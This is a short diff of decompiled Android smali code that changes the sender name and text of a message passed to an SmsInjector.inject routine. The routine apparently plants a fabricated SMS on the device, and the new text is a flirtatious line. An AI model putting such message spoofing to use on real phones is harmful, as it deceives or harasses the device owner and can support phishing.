@@ -44,9 +44,9 @@
     :try_start_0
     iget-object v0, p0, Lcom/virtus/module/MainActivity$4;->val$act:Landroid/app/Activity;
 
-    const-string v1, "CHACHA"
+    const-string v1, "ASTIK"
 
-    const-string v2, "Chacha Ji Pani Pila Do?"
+    const-string v2, "hello baby aau kya?"
 
     invoke-static {v0, v1, v2}, Lcom/virtus/module/SmsInjector;->inject(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)Z
 
